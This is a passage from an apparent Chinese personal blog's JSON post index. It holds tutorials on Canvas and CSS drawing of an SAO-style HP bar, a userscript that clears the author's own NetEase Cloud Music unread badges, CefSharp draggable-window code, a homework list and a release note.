绘制图片1ctx.drawImage(flashIcon, x, y, 20, 20); 参考：MDN 文档 渐变色 12345678let bgColor = ctx.createLinearGradient(x, 0, x+bgW, 0);bgColor.addColorStop(0, 'rgba(255, 255, 255, 0.40)');bgColor.addColorStop(0.3, 'rgba(255, 255, 255, 0.40)');bgColor.addColorStop(1, 'rgba(255, 255, 255, 0.06)');//...ctx.fillStyle = bgColor;ctx.fill(); 参考：MDN 文档 绘制文字12345678910111213// 绘制文字function putText(text, x, y, size, color) &#123; let f = ctx.font, s = ctx.fillStyle, a = ctx.textAlign, b = ctx.textBaseline; ctx.font = `$&#123;size || 18&#125;px SAOUI`; ctx.fillStyle = color || '#FFF'; ctx.textAlign = 'center'; ctx.textBaseline = 'middle'; ctx.fillText(text, x, y); ctx.font = f; ctx.fillStyle = s; ctx.textAlign = a; ctx.textBaseline = b;&#125; 参考：MDN 文档 阴影 123456789101112ctx.shadowColor = \"black\";ctx.shadowBlur = 6;ctx.shadowOffsetX = 6;ctx.shadowOffsetY = 6;ctx.shadowColor = \"orange\";ctx.strokeRect(25, 25, 200, 200);ctx.shadowColor = \"green\";ctx.strokeRect(50, 50, 200, 200);ctx.shadowColor = \"blue\";ctx.strokeRect(75, 75, 200, 200);ctx.shadowColor = \"red\";ctx.strokeRect(100, 100, 200, 200); 参考：w3resource 高斯模糊 Blur 123ctx.filter = 'blur(4px)';ctx.font = '48px serif';ctx.fillText('Hello world', 50, 100); 参考：MDN 文档 放大缩小1ctx.scale(2, 2) // Doubles size of anything draw to canvas. 参考：MDN 文档 Transform 12345const canvas = document.getElementById('canvas');const ctx = canvas.getContext('2d');ctx.transform(1, .2, .8, 1, 0, 0);ctx.fillRect(0, 0, 100, 100); 参考：Canvas transform浅析 / MDN 文档 绘制圆角HTML canvas arcTo() Method: The arcTo() method creates an arc/curve between two tangents on the canvas. Tip: Use the stroke() method to actually draw the arc on the canvas. 1context.arcTo(x1,y1,x2,y2,r); 参考：w3schools 绘制圆角矩形 123456789101112CanvasRenderingContext2D.prototype.roundRect = function (x, y, w, h, r) &#123; if (w &lt; 2 * r) &#123;r = w / 2;&#125; if (h &lt; 2 * r)&#123; r = h / 2;&#125; this.beginPath(); this.moveTo(x+r, y); this.arcTo(x+w, y, x+w, y+h, r); this.arcTo(x+w, y+h, x, y+h, r); this.arcTo(x, y+h, x, y, r); this.arcTo(x, y, x+w, y, r); this.closePath(); return this;&#125; 参考：CSDN 坐标变换改变原点： 1void ctx.translate(x, y); The translate() method adds a translation transformation to the current matrix by moving the canvas and its origin x units horizontally and y units vertically on the grid. 参考：cnblogs 清空画布1void ctx.clearRect(x, y, width, height); 12345678910111213141516171819const canvas = document.getElementById('canvas');const ctx = canvas.getContext('2d');// Draw yellow backgroundctx.beginPath();ctx.fillStyle = '#ff6';ctx.fillRect(0, 0, canvas.width, canvas.height);// Draw blue trianglectx.beginPath();ctx.fillStyle = 'blue';ctx.moveTo(20, 20);ctx.lineTo(180, 20);ctx.lineTo(130, 130);ctx.closePath();ctx.fill();// Clear part of the canvasctx.clearRect(10, 10, 120, 100); 参考：MDN 文档 / CSDN HP Bar 成品 和 TV 截图比较： 几乎算得上完美！ 传送到 GitHub 查看代码 / 查看 DEMO 最后 感叹一句 ——— “Canvas 真香！” 对了，在找资料的时候看到了个骚东西，hhhh： 这时立刻就会想到那些年代久远的广告（笑死 通过 Wayback Machine 你可以找到那些有趣的黑历史，例如：","categories":[{"name":"前端","slug":"前端","permalink":"http://qwqaq.com/categories/前端/"},{"name":"Canvas","slug":"前端/Canvas","permalink":"http://qwqaq.com/categories/前端/Canvas/"}],"tags":[{"name":"JS","slug":"JS","permalink":"http://qwqaq.com/tags/JS/"},{"name":"刀剑神域","slug":"刀剑神域","permalink":"http://qwqaq.com/tags/刀剑神域/"},{"name":"SAO","slug":"SAO","permalink":"http://qwqaq.com/tags/SAO/"},{"name":"UI","slug":"UI","permalink":"http://qwqaq.com/tags/UI/"},{"name":"HTML5","slug":"HTML5","permalink":"http://qwqaq.com/tags/HTML5/"},{"name":"Canvas","slug":"Canvas","permalink":"http://qwqaq.com/tags/Canvas/"}]},{"title":"纯 CSS 自写一个 刀剑神域 SAO UI 的 HP Bar","slug":"纯-CSS-自写一个-刀剑神域-SAO-UI-的-HP-Bar","date":"2019-01-20T14:48:07.000Z","updated":"2019-01-31T13:24:58.279Z","comments":true,"path":"e90e2cd7.html","link":"","permalink":"http://qwqaq.com/e90e2cd7.html","excerpt":"觉得刀剑神域序这部神番的 SAO UI 好好看呀～～ 哇哇哇～～～ 想尝试着用 CSS 自己写一个（虽然想着就麻烦），就当练习一下 CSS，看看我能不能写的出来。结果受尽折磨，虽然还有点意思。。。CSS 来做嘛，效果不是很好，仔细看能看出中间边框那里有一点点瑕疵，斜切的效果比较难搞。。特别是血量的中间部分（喷血","text":"觉得刀剑神域序这部神番的 SAO UI 好好看呀～～ 哇哇哇～～～ 想尝试着用 CSS 自己写一个（虽然想着就麻烦），就当练习一下 CSS，看看我能不能写的出来。结果受尽折磨，虽然还有点意思。。。CSS 来做嘛，效果不是很好，仔细看能看出中间边框那里有一点点瑕疵，斜切的效果比较难搞。。特别是血量的中间部分（喷血 需要实现的效果，原剧截图： SAO UI 字体从左往右看，首先去找 SAO UI 的字体。 Google 一哈找到了 sao-ui-font 边框 + 两层 box-shadow可以这样写：box-shadow: inset 9px 0px 8px 2px rgba(125, 125, 125, 0.61), inset 0.3px 0px 0 2px rgba(0, 0, 0, 0.53); （内黑边 + 内阴影） 通过 inset 指定阴影显示在容器的 内 边缘 然后再加一圈 Border：border: 2px solid #d5d628; 最终效果： 渐变背景怎么搞？background: linear-gradient(red, green, blue); 这种骚渐变，用来做骚网站最适合不过。 最麻烦的血量指示器斜切123&lt;div class=\"wrap\"&gt; &lt;div class=\"card\"&gt;&lt;/div&gt;&lt;/div&gt; 12345678910111213.wrap &#123; width: 60px; /* 预先设定一个 width */ height: 30px; overflow: hidden; /* 让超出 div.wrap 的部分不显示 */&#125;.card &#123; height: 100%; width: 54px; transform: skewX(-30deg); /* 用 skewX 来让 div 倾斜 */ margin-left: -8px; /* 将 div 往左移（结合 overflow 隐藏左侧），只显示右侧倾斜 */ background: #84de1c;&#125; 实现效果： 最后将血量拆分为 4 个 div 部分（正 + 斜 + 正 + 斜），用 position: absolute 的方法一个一个拼起来 P.S. 其实可以拆分为 3 个部分（正 + 斜 + 斜）… 算了… 懒得改了 我把边框做成单独的一层，position: absolute，然后 z-index 设置为最大（置顶），同理和血量一起倾斜 HTML 结构是这样的。。。 1234567891011121314151617181920212223242526&lt;div class=\"hp-border\"&gt; &lt;div class=\"hp-border-left\"&gt; &lt;div class=\"hp-border-left-inner\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=\"hp-border-left-sloping\"&gt; &lt;div class=\"hp-border-left-sloping-inner\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=\"hp-border-right\"&gt; &lt;div class=\"hp-border-right-inner\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=\"hp-border-right-sloping\"&gt; &lt;div class=\"hp-border-right-sloping-inner\"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;div class=\"hp-value-wrap\"&gt; &lt;div class=\"hp-value-mask\"&gt;&lt;/div&gt; &lt;div class=\"hp-value-left\"&gt;&lt;/div&gt; &lt;div class=\"hp-value-left-sloping\"&gt; &lt;div class=\"hp-value-left-sloping-inner\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=\"hp-value-right\"&gt;&lt;/div&gt; &lt;div class=\"hp-value-right-sloping\"&gt; &lt;div class=\"hp-value-right-sloping-inner\"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 部分 CSS（比较乱，可能重复的代码未整理）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148/* hp-value */.hp-value &#123; position: relative; width: 365px; height: 25px;&#125;.hp-value-mask &#123; position: absolute; z-index: 3; background: linear-gradient(rgba(74, 74, 74, 0.5), rgba(74, 74, 74, 0.24), rgba(74, 74, 74, 0)); width: 99%; height: 13px; top: 0; left: 0;&#125;.hp-value-left &#123; z-index: 2; top: 0; left: 0; width: 55%; height: 25px; position: absolute; background: #84de1c;&#125;.hp-value-left-sloping &#123; z-index: 2; top: 0; left: 55%; width: 5%; height: 25px; position: absolute; overflow: hidden;&#125;.hp-value-left-sloping-inner &#123; height: 100%; width: calc(100% + 31px); margin-left: -30px; transform: skewX(-30deg); background: #84de1c;&#125;.hp-value-right &#123; z-index: 2; top: 0; left: 60%; width: 35%; height: 15px; position: absolute; background: #84de1c;&#125;.hp-value-right-sloping &#123; z-index: 2; top: 0; left: 95%; width: 5%; height: 15px; position: absolute; overflow: hidden;&#125;.hp-value-right-sloping-inner &#123; height: 100%; width: calc(5% + 38px); margin-left: -30px; background: #84de1c; transform: skewX(-30deg);&#125;/* hp-border */.hp-border &#123; width: 100%; height: 30px;&#125;.hp-border &gt; div &#123; position: absolute; top: 0; z-index: 4;&#125;.hp-border-left &#123; left: 0; height: 30px; width: 57.3%; overflow: hidden;&#125;.hp-border-left-inner &#123; height: 25px; width: calc(100% + 20px); border: 2px solid #d5d628; box-shadow: inset 0 0px 8px 2px rgba(125, 125, 125, 0.61), inset 0 0px 0 2px rgba(0, 0, 0, 0.53);&#125;.hp-border-left-sloping &#123; left: 57.3%; height: 30px; width: 2.7%; overflow: hidden;&#125;.hp-border-left-sloping-inner &#123; height: 25px; border: 2px solid #d5d628; border-right-width: 2px; box-shadow: inset 9px 0px 8px 2px rgba(125, 125, 125, 0.61), inset 0.3px 0px 0 2px rgba(0, 0, 0, 0.53); width: calc(100% + 32px); margin-left: -32.95px; transform: skewX(-35deg);&#125;.hp-border-right &#123; left: 60%; height: 20px; width: 36%; overflow: hidden;&#125;.hp-border-right-inner &#123; height: 14px; border: 2px solid #d5d628; box-shadow: inset 0 0px 8px 1.7px rgba(125, 125, 125, 0.61), inset 0 0px 0 2px rgba(0, 0, 0, 0.53); width: calc(100% + 40px); margin-left: -32px; transform: skewX(-30deg);&#125;.hp-border-right-sloping &#123; left: 96%; height: 20px; width: 5%; overflow: hidden;&#125;.hp-border-right-sloping-inner &#123; height: 14px; border: 2px solid #d5d628; border-right-width: 2.5px; box-shadow: inset 9px 0px 8px 2px rgba(125, 125, 125, 0.61), inset -0.4px 0px 0 2px rgba(0, 0, 0, 0.53); width: calc(100% + 31px); margin-left: -41.6px; transform: skewX(-30deg);&#125; 不知道有没有更简便的方法。。（估计也没有了，毕竟是拿 CSS 来做） 其余部分闪电 SVG 图标： 1&lt;svg viewBox=\"0 0 72.89 111.59\"&gt;&lt;path d=\"M45.27,119.72a3.49,3.49,0,0,0,1.34.53A3.77,3.77,0,0,0,50.05,119L99.81,64.31a4.22,4.22,0,0,0,1-4.1,3.89,3.89,0,0,0-3-2.71L73.18,53.26,86.91,14.17a4.18,4.18,0,0,0-1.4-4.79,3.66,3.66,0,0,0-4.74.44L29.37,59.46a4.19,4.19,0,0,0-1.16,4.17,3.83,3.83,0,0,0,3.05,2.83l27.2,4.66-14.69,43.8A4,4,0,0,0,45.27,119.72Z\" transform=\"translate(-28.05 -8.7)\"&gt;&lt;/path&gt;&lt;/svg&gt; 闪电图标块外发光： box-shadow: 0 0 3px #f3f315; 血量上的阴影 遮罩层 &lt;div class=&quot;hp-value-mask&quot;&gt;&lt;/div&gt;： 123456789.hp-value-mask &#123; position: absolute; z-index: 3; background: linear-gradient(rgba(74, 74, 74, 0.5), rgba(74, 74, 74, 0.24), rgba(74, 74, 74, 0)); width: 99%; height: 13px; top: 0; left: 0;&#125; 最终效果qwqcode.github.io/SAO-UI/SAO_HP_Bar_CSS.html 开了一个 GayHub 仓库 -&gt; 传送门，以后自写的 SAO UI 就都放这里面啦 ٩(ˊᗜˋ*)و","categories":[{"name":"前端","slug":"前端","permalink":"http://qwqaq.com/categories/前端/"},{"name":"CSS","slug":"前端/CSS","permalink":"http://qwqaq.com/categories/前端/CSS/"}],"tags":[{"name":"刀剑神域","slug":"刀剑神域","permalink":"http://qwqaq.com/tags/刀剑神域/"},{"name":"SAO","slug":"SAO","permalink":"http://qwqaq.com/tags/SAO/"},{"name":"UI","slug":"UI","permalink":"http://qwqaq.com/tags/UI/"},{"name":"CSS","slug":"CSS","permalink":"http://qwqaq.com/tags/CSS/"},{"name":"HTML5","slug":"HTML5","permalink":"http://qwqaq.com/tags/HTML5/"}]},{"title":"网易云音乐 模拟真实操作 一键清除每天 99+ 的私信角标","slug":"网易云音乐-模拟真实操作-一键清除每天-99+-的私信角标","date":"2019-01-18T11:20:00.000Z","updated":"2019-01-28T14:15:57.429Z","comments":true,"path":"fe2cece5.html","link":"","permalink":"http://qwqaq.com/fe2cece5.html","excerpt":"强迫症患者受不了每天 99+ 的角标，然而网易云音乐迟迟不做一键全部标为已读按钮，所以决定自己实现这个功能。本文将讲述：通过模拟真实操作，在云音乐网页版私信页面（使用 iframe 局部刷新的页面）连续查看私信并返回列表来实现一键清除角标的功能。","text":"强迫症患者受不了每天 99+ 的角标，然而网易云音乐迟迟不做一键全部标为已读按钮，所以决定自己实现这个功能。本文将讲述：通过模拟真实操作，在云音乐网页版私信页面（使用 iframe 局部刷新的页面）连续查看私信并返回列表来实现一键清除角标的功能。 首先，来到云音乐网页版私信页面：https://music.163.com/#/msg/m/private 打开 Console，JavaScript context 需要选择 contentFrame 以切换到 私信列表的 &lt;iframe&gt;。因为网易音乐用了 &lt;iframe&gt;（为了保持音乐播放不断），所以我们的 JS 代码需要执行于 &lt;iframe&gt; 中。 注：本文所说的 item 意为 私信列表 中的 其中一个私信 为了让 JS 能够方便地在 &lt;iframe&gt; 中执行，可以用 Chrome 的扩展程序 Violentmonkey (暴力猴)，将代码注入其中。 大概的流程是这样的： 得到 私信列表 所有的 item 处理第 n 个 item var item = document.querySelectorAll(&#39;.item.f-cb&#39;)[n] 判断这个 item 是否有角标 Number(item.attributes[&#39;data-count&#39;].value) 若 !== 0 则说明有角标，反之则否 执行打开这个 item item.click() （即发送请求给网易云音乐服务器，告知已读） 私信内容页 开始加载 -&gt; 加载完毕 执行 返回到私信列表 window.history.back() 私信列表页 开始加载 -&gt; 加载完毕 n++ 之后再次执行第一步（处理下一个 item） 具体实现，暴力猴插件： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283// ==UserScript==// @name 网易云音乐 私信一键全部标为已读 按钮// @namespace qwqaq.com// @version 1.0// @match *://music.163.com/*// @description 网易云音乐 模拟真实操作 一键清除每天 99+ 的私信角标// @grant none// @run-at document-end// ==/UserScript==(function() &#123; 'use strict'; if (document.querySelector('.v-hd3 .tit').innerText !== \"私信\") return; function setOnLoadingEnd(onLoadingEnd) &#123; var isLoading = false; var id = setInterval(function() &#123; if (document.querySelector('.u-load') !== null) &#123; if (isLoading === true) return; isLoading = true; &#125; else &#123; if (isLoading === false) return; isLoading = false; onLoadingEnd(); clearInterval(id); &#125; &#125;, 30); &#125; var lock = false; // 用于判断是否可执行处理下一个 item var i = 0; var pageNum = 1; var inid = null; function actionStart() &#123; // 执行直到全部角标清除为止 inid = setInterval(function() &#123; if (lock === false) &#123; lock = true; var item = document.querySelectorAll('.item.f-cb')[i]; if (Number(item.attributes['data-count'].value) !== 0) &#123; // 需要角标清零： item.click(); console.log(item); setOnLoadingEnd(function() &#123; // 结束加载后执行 setTimeout(function() &#123; window.history.back(); // 返回列表 setOnLoadingEnd(function() &#123; setTimeout(function() &#123; lock = false; // 解除锁定 i++; &#125;, 500); &#125;); &#125;, 500); &#125;); &#125; else &#123; lock = false; i++; &#125; if (i &gt;= document.querySelectorAll('.item.f-cb').length) &#123; clearInterval(inid); &#125; &#125; &#125;, 30); &#125; setOnLoadingEnd(function () &#123; // 创建按钮 var btn = document.createElement('button'); var btn = document.createElement('button'); btn.setAttribute('class', 'mail u-btn2 u-btn2-1'); btn.setAttribute('style', 'margin-right: 10px'); btn.innerHTML = '&lt;i&gt;一键清除角标&lt;/i&gt;'; btn.onclick = function () &#123; if (inid !== null) clearInterval(inid); actionStart(); &#125;; document.querySelector('.v-hd3').appendChild(btn); &#125;);&#125;)();","categories":[{"name":"JS","slug":"JS","permalink":"http://qwqaq.com/categories/JS/"}],"tags":[{"name":"网易云音乐","slug":"网易云音乐","permalink":"http://qwqaq.com/tags/网易云音乐/"},{"name":"消除角标","slug":"消除角标","permalink":"http://qwqaq.com/tags/消除角标/"},{"name":"强迫症","slug":"强迫症","permalink":"http://qwqaq.com/tags/强迫症/"}]},{"title":"201901 快乐寒假的作业","slug":"201901-快乐寒假的作业","date":"2019-01-18T10:00:07.000Z","updated":"2019-01-28T14:15:57.376Z","comments":true,"path":"5a8e07f0.html","link":"","permalink":"http://qwqaq.com/5a8e07f0.html","excerpt":"I know, U know, We all know…","text":"I know, U know, We all know… 语文 发的册子（0/16） 名著读后感 x1 电影观后感 x1 字帖 30 页 数学 核心突破（二）（十六）（十五） 周报 复习专刊 31, 33, 35, 37, 39, 40 期 英语 所有周报 背单词 政治 《优化设计》 必修二 自主预习 部分 历史 必修一 单元整合 的 知识网络 抄一遍，并每单元选 一个选择题、一个问答题（笔记本） 预习 必修二 第一单元 地理（快乐寒假） 物理 4 张周报 化学 4 张周报 2 张核心突破 归纳所有知识点（笔记本上） 创新设计、小册子 全部做完 生物 《课时作业》 单元检测卷 全部（必修一） 必修一 每单元的思维导图（画作业本上） 组内作业（4~6 组）主题作文：我为长辈讲文明、我们的节日（要求：作文 + 照片）","categories":[{"name":"日常","slug":"日常","permalink":"http://qwqaq.com/categories/日常/"}],"tags":[{"name":"作业","slug":"作业","permalink":"http://qwqaq.com/tags/作业/"},{"name":"快乐寒假","slug":"快乐寒假","permalink":"http://qwqaq.com/tags/快乐寒假/"}]},{"title":"Nacollector v1.3.0.0 发布","slug":"Nacollector-v1-3-0-0-发布","date":"2018-12-31T15:59:29.000Z","updated":"2019-01-28T14:15:57.385Z","comments":true,"path":"8557f9bf.html","link":"","permalink":"http://qwqaq.com/8557f9bf.html","excerpt":"2018 年最后一天敲的代码，刺激啊。。。 我要去面对现实了。我也是真的猛士，作业又堆到最后一天做，眼看就要期末考试了，很皮，很方，无以言表的赶jio。。。溜了溜了 (ó﹏ò｡) 等等，我番剧还没看完呢。。。 传送到 GitHub","text":"2018 年最后一天敲的代码，刺激啊。。。 我要去面对现实了。我也是真的猛士，作业又堆到最后一天做，眼看就要期末考试了，很皮，很方，无以言表的赶jio。。。溜了溜了 (ó﹏ò｡) 等等，我番剧还没看完呢。。。 传送到 GitHub 本次更新 前端界面优化 前后端已分离，采用 WebPack，新开了一个项目 传送门 自写了标题栏，CSS -webkit-app-region: drag 指定区域模拟系统标准标题栏拖动，双击最大化等 传送门 / 传送门 调用 重新下载 函数 undefined 问题修复 更换了 创建下载任务 的方式 微调颜色，微调 logo，微调页面布局 改掉了其它一些有瑕疵的地方 CefShap 更新到 v69 传送门 修复 阿里巴巴 采集问题 And more… 祝大家新年快乐，新的一年新的开始，加油哟！ヾ(≧∇≦*)ゝ","categories":[{"name":"项目","slug":"项目","permalink":"http://qwqaq.com/categories/项目/"},{"name":"Nacollector","slug":"项目/Nacollector","permalink":"http://qwqaq.com/categories/项目/Nacollector/"}],"tags":[{"name":"更新发布","slug":"更新发布","permalink":"http://qwqaq.com/tags/更新发布/"},{"name":"Nacollector","slug":"Nacollector","permalink":"http://qwqaq.com/tags/Nacollector/"}]},{"title":"你好 2019，2018 已成为过去","slug":"你好-2019，2018-已成为过去","date":"2018-12-31T15:48:11.000Z","updated":"2019-02-19T14:46:38.142Z","comments":true,"path":"bac71dff.html","link":"","permalink":"http://qwqaq.com/bac71dff.html","excerpt":"","text":"我越是逃离，却越是靠近你，我越是背过脸，却越是看见你。我是一座孤岛，处在相思之水中，四面八方，隔绝我通向你。一千零一面镜子，转映着你的容颜，我从你开始，我在你结束。 ——埃姆朗·萨罗希","categories":[{"name":"日常","slug":"日常","permalink":"http://qwqaq.com/categories/日常/"}],"tags":[]},{"title":"CefSharp 实现类似 Electron 可拖拽区功能","slug":"CefSharp-实现类似-Electron-可拖拽区功能","date":"2018-12-30T01:52:15.000Z","updated":"2019-01-28T14:15:57.379Z","comments":true,"path":"57a3ffd3.html","link":"","permalink":"http://qwqaq.com/57a3ffd3.html","excerpt":"在 Electron 文档 中这样写道： 可拖拽区：默认情况下, 无边框窗口是不可拖拽的。 应用程序需要在 CSS 中指定 -webkit-app-region: drag 来告诉 Electron 哪些区域是可拖拽的（如操作系统的标准标题栏），在可拖拽区域内部使用 -webkit-app-region: no-drag 则可以将其中部分区域排除。 请注意, 当前只支持矩形形状。 如果能让 CefSharp 实现像 Electron 这样的功能，那我就能在设置了无边框的窗体上美滋滋地自定义标题栏，例如：Material Design, Fluent Design… 而不仅仅是 WinForm 自带的风格。","text":"在 Electron 文档 中这样写道： 可拖拽区：默认情况下, 无边框窗口是不可拖拽的。 应用程序需要在 CSS 中指定 -webkit-app-region: drag 来告诉 Electron 哪些区域是可拖拽的（如操作系统的标准标题栏），在可拖拽区域内部使用 -webkit-app-region: no-drag 则可以将其中部分区域排除。 请注意, 当前只支持矩形形状。 如果能让 CefSharp 实现像 Electron 这样的功能，那我就能在设置了无边框的窗体上美滋滋地自定义标题栏，例如：Material Design, Fluent Design… 而不仅仅是 WinForm 自带的风格。 效果 GIF 成品 Example传送到 GitHub Why CefSharp? Why should you consider CEF as an alternative to Electron? Because it is more flexible and allows very powerful combinations of different technologies. – 来源于网络 个人觉得 CefSharp 是直接上 CEF，后端是 C#，你想干嘛就干嘛，这点很爽。 其次是做的 APP 体积会比 Electron 小，占用内存也会比较小。 参见：传送门 实现过程你可以选择跳过这里，来节约时间，直接看源码：Form1.cs 思路是这样的：监听鼠标点击事件，当鼠标左键按下的时候，判断是否在 设置了 CSS -webkit-app-region: drag; 的区域内，若 True 则执行像操作系统的标准标题栏那样的拖拽。 鼠标点击事件首先我尝试直接用 Control.MouseDown += ...，但这是不行的，作为一名 Ctrl+C Ctrl+V 开发者，疯狂翻资料，打开一溜选项卡，知道了原因是：传送门 The underlying CEF library captures all mouse events and does not bubble them up to WinForms. There’s no way around this for WinForms - if you want to handle mouse events you need to do so in JavaScript. Your alternative is to use the WPF CefSharp control, as this uses the underlying CEF library’s OSR (Off Screen Rendering) mode, in which WPF is in charge of all keyboard and mouse events, and it passes them onto CEF. This would give you an opportunity to intercept whatever events you wanted. CefSharp 监听鼠标事件需要这样写：传送门 123456789101112131415161718192021222324class ChromeWidgetMessageInterceptor : NativeWindow&#123; public ChromeWidgetMessageInterceptor(IntPtr chromeWidgetHostHandle) &#123; AssignHandle(chromeWidgetHostHandle); &#125; const int WM_MOUSEMOVE = 0x0200; const int WM_MOUSELEAVE = 0x02A3; protected override void WndProc(ref Message m) &#123; base.WndProc(ref m); switch (m.Msg) &#123; case WM_MOUSEMOVE: Console.WriteLine(\"WM_MOUSEMOVE\"); break; case WM_MOUSELEAVE: Console.WriteLine(\"WM_MOUSELEAVE\"); break; &#125; &#125;&#125; Stackoverflow: C# Detecting a Click in WndProc and calling a function after click happened WndProc 函数作用：主要在程序中拦截并处理系统消息和自定义消息 比如：Windows 程序会产生很多消息，比如你单击鼠标，移动窗口都会产生消息。这个函数就是默认的消息处理函数。你可以重载这个函数来制定自己的消息处理流程. 在 CS 中，可以重写 WndProc 函数，来捕捉所有发生有窗口消息。这样，我们就可以”篡改”传入的消息，而人为的让窗口改变行为。 参见：传送门 WndProc 函数可以监听到这个窗体的任何鼠标事件，也就是说在任何 Control 上的鼠标事件都会触发 WndProc 函数。 通过重写 WndProc 函数，则可实现当鼠标左键按下 (WM_LBUTTONDOWN = 0x0201) 执行 拖动系统的标准标题栏 操作。 附：WindProc 各种 Message 的常量定义代码 / 各种 Message 的具体解释文档 我们需要的 Message 是 WM_LBUTTONDOWN，文档传送门 Posted when the user presses the left mouse button while the cursor is in the client area of a window. If the mouse is not captured, the message is posted to the window beneath the cursor. Otherwise, the message is posted to the window that has captured the mouse. A window receives this message through its WindowProc function. 所以，监听鼠标点击事件问题就解决了。 模拟 WinForm 标题栏拖动至于 拖动系统的标准标题栏 的操作代码怎么写，我又逛起了 Google 找到了：传送门：Make a borderless form movable? 12345678910111213141516public const int WM_NCLBUTTONDOWN = 0xA1;public const int HT_CAPTION = 0x2;[System.Runtime.InteropServices.DllImportAttribute(\"user32.dll\")]public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);[System.Runtime.InteropServices.DllImportAttribute(\"user32.dll\")]public static extern bool ReleaseCapture();private void Form1_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)&#123; if (e.Button == MouseButtons.Left) &#123; ReleaseCapture(); SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0); &#125;&#125; This essentially does exactly the same as grabbing the title bar of a window, from the window manager’s point of view. 这样，当鼠标拖动到屏幕边界最大化窗口的功能也有了。 注：SendMessage(...) 必须在 UI 线程中执行，且必须异步执行，否则会卡死 123456// 必须是 BeginInvoke 异步执行，否则在 win7 环境下会卡死winForm.BeginInvoke((MethodInvoker)delegate&#123; ReleaseCapture(); SendMessage(winForm.Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);&#125;); 得到设置 CSS -webkit-app-region: drag 的区域CefSharp 项目中的 CefSharp.Wpf.Example 写过 Handle 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374// Copyright © 2016 The CefSharp Authors. All rights reserved.//// Use of this source code is governed by a BSD-style license that can be found in the LICENSE file.using System;using System.Collections.Generic;using System.Drawing;using CefSharp.Enums;namespace CefSharp.Wpf.Example.Handlers&#123; public class DragHandler : IDragHandler, IDisposable &#123; public event Action&lt;Region&gt; RegionsChanged; public Region draggableRegion; // 需要在当按下鼠标左键时判断指针是否正处于该区域中 bool IDragHandler.OnDragEnter(IWebBrowser browserControl, IBrowser browser, IDragData dragData, DragOperationsMask mask) &#123; return false; &#125; void IDragHandler.OnDraggableRegionsChanged(IWebBrowser browserControl, IBrowser browser, IList&lt;DraggableRegion&gt; regions) &#123; //By default popup browers are native windows in WPF so we cannot handle their drag using this method if (browser.IsPopup == false) &#123; //NOTE: I haven't tested with dynamically adding removing regions so this may need some tweaking draggableRegion = null; if (regions.Count &gt; 0) &#123; //Take the individual Region and construct a complex Region that represents them all. // 得到设置了 CSS -webkit-app-region 的所有区域 foreach (var region in regions) &#123; var rect = new Rectangle(region.X, region.Y, region.Width, region.Height); if (draggableRegion == null) &#123; draggableRegion = new Region(rect); &#125; else &#123; if (region.Draggable) // -webkit-app-region: drag &#123; draggableRegion.Union(rect); &#125; else // -webkit-app-region: no-drag &#123; //In the scenario where we have an outer region, that is draggable and it has // an inner region that's not, we must exclude the non draggable. // Not all scenarios are covered in this example. draggableRegion.Exclude(rect); &#125; &#125; &#125; &#125; var handler = RegionsChanged; if (handler != null) &#123; handler(draggableRegion); &#125; &#125; &#125; public void Dispose() &#123; RegionsChanged = null; &#125; &#125;&#125; 判断指针坐标是否在 Region 内通过上面的代码，我们得到了 Region draggableRegion。 如何判断鼠标指针 (x, y) 是否处于 draggableRegion 区域中？ 参阅 Stackoverflow：How to know if a GraphicsPath contains a point in C# A GraphicsPath has the IsVisible method to check if a point is in the path. 123bool isInPath = draggableRegion.IsVisible(x, y)// 或bool isInPath = draggableRegion.IsVisible(Point) 官方文档：Region.IsVisible Method WndProc 函数，如何获取鼠标指针坐标 (x, y) ？方法一 处理 message.LParam 得到 x, y 12ushort x = LOWORD((uint)message.LParam);ushort y = HIWORD((uint)message.LParam); 12345678910111213141516171819public static ushort LOWORD(uint value)&#123; return (ushort)(value &amp; 0xFFFF);&#125;public static ushort HIWORD(uint value)&#123; return (ushort)(value &gt;&gt; 16);&#125;public static byte LOWBYTE(ushort value)&#123; return (byte)(value &amp; 0xFF);&#125;public static byte HIGHBYTE(ushort value)&#123; return (byte)(value &gt;&gt; 8);&#125; 方法二 直接 new 一个 Point Stackoverflow: WndProc Hook lParam to xy cords? 1Point point = new Point(message.LParam.ToInt32()); 选择方法二，简单直接。 Ending觉得其他有用的链接： GitHub: /CefSharp.WinForms.Example/BrowserTabUserControl.cs GitHub: /CefSharp.Example/Resources/DraggableRegionTest.html GitHub: /CefSharp.Wpf.Example/Handlers/DragHandler.cs Stackoverflow： programmatically mouse click in another window C# 重写WndProc 拦截 发送 系统消息 + windows消息常量值（2） C# 利用委托跨线程调用UI控件完整使用方法 Stackoverflow C# – 在玻璃上渲染控件：发现解决方案,需要双缓冲/完善","categories":[{"name":"CSharp","slug":"CSharp","permalink":"http://qwqaq.com/categories/CSharp/"}],"tags":[{"name":"CSharp","slug":"CSharp","permalink":"http://qwqaq.com/tags/CSharp/"},{"name":"CefSharp","slug":"CefSharp","permalink":"http://qwqaq.com/tags/CefSharp/"},{"name":"Electron","slug":"Electron","permalink":"http://qwqaq.com/tags/Electron/"},{"name":"无边框","slug":"无边框","permalink":"http://qwqaq.com/tags/无边框/"},{"name":"可拖拽区","slug":"可拖拽区","permalink":"http://qwqaq.com/tags/可拖拽区/"},{"name":"监听鼠标事件","slug":"监听鼠标事件","permalink":"http://qwqaq.com/tags/监听鼠标事件/"}]},{"title":"坚果 Pro 2 